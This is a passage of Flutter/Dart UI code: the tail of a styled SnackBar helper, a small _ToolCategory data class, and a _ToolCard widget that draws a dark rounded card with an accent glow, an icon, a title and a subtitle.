    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(icon, color: platinum, size: 18),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                message,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 14,
                  fontWeight: FontWeight.w400,
                ),
              ),
            ),
          ],
        ),
        backgroundColor: backgroundColor,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(20),
        duration: const Duration(seconds: 2),
      ),
    );
  }
}

class _ToolCategory {
  final IconData icon;
  final String title;
  final String subtitle;
  final String stat;
  final Color accent;
  final Color accentSecondary;

  const _ToolCategory({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.stat,
    required this.accent,
    required this.accentSecondary,
  });
}

class _ToolCard extends StatelessWidget {
  final _ToolCategory category;
  final VoidCallback onTap;

  const _ToolCard({required this.category, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(24),
        splashColor: category.accent.withOpacity(0.1),
        highlightColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.35),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: category.accent.withOpacity(0.25),
              width: 1.2,
            ),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.25),
                blurRadius: 15,
                offset: const Offset(0, 8),
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: Stack(
              children: [
                Positioned(
                  top: -15,
                  right: -15,
                  child: Container(
                    width: 70,
                    height: 70,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(
                        colors: [
                          category.accent.withOpacity(0.12),
                          Colors.transparent,
                        ],
                      ),
                    ),
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(18),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Container(
                        width: 48,
                        height: 48,
                        decoration: BoxDecoration(
                          color: category.accent.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(
                            color: category.accent.withOpacity(0.35),
                            width: 1.2,
                          ),
                        ),
                        child: Icon(
                          category.icon,
                          color: category.accent,
                          size: 22,
                        ),
                      ),
                      const Spacer(),
                      Text(
                        category.title,
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 16,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 0.2,
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                      const SizedBox(height: 4),
                      Text(
                        category.subtitle,
                        style: TextStyle(
                          color: platinum.withOpacity(0.5),
                          fontSize: 11,
                          height: 1.3,
                        ),
                        maxLines: 2,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
